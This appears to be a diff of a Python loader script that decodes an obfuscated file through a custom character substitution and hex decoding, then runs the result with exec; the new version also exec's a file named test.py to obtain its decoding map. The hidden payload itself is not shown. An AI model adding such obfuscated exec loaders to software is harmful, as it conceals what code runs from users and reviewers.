@@ -1,47 +1,23 @@
 import os
-import sys
-import hashlib
 
-_HASH = "90b011ac65424dc1df64f9de8cd56edb944e39a2ad233325cee6b15bf25d36ce"
-_key = os.environ.get("KIRA_KEY", "")
-if hashlib.sha256(_key.encode()).hexdigest() != _HASH:
-    print("Unauthorized.")
-    sys.exit(1)
+_here = os.path.dirname(os.path.abspath(__file__))
 
-def _decode(s: str) -> str:
-    tokens = [
-        ("<>|~", "A"),
-        ("|~~~", "E"),
-        ("|<>", "B"),
-        ("<>|", "D"),
-        ("|~~", "F"),
-        ("(", "C"),
-    ]
-    junk = set("#%₦¥")
-    digits = set("0123456789")
-    out = []
-    i = 0
-    while i < len(s):
-        ch = s[i]
-        if ch in junk:
-            i += 1
-            continue
-        if ch in digits:
-            out.append(ch)
-            i += 1
-            continue
-        hit = False
-        for token, letter in tokens:
-            if s[i:i + len(token)] == token:
-                out.append(letter)
-                i += len(token)
-                hit = True
-                break
-        if not hit:
-            i += 1
-    return bytes.fromhex("".join(out)).decode("utf-8")
+# Load key from test.py
+_ns = {}
+exec(open(os.path.join(_here, 'test.py')).read(), _ns)
+_cfg = _ns['_cfg']
 
-here = os.path.dirname(os.path.abspath(__file__))
-with open(os.path.join(here, "encoded.kira"), encoding="utf-8") as f:
-    src = _decode(f.read())
-exec(compile(src, "bot.py", "exec"))
+def _dec(s):
+    D = set('0123456789')
+    r = []
+    for ch in s:
+        if ch in _cfg:
+            r.append(_cfg[ch])
+        elif ch in D:
+            r.append(ch)
+    return bytes.fromhex(''.join(r)).decode('utf-8')
+
+with open(os.path.join(_here, 'run.py'), encoding='utf-8') as f:
+    _src = _dec(f.read())
+
+exec(compile(_src, 'run.py', 'exec'))
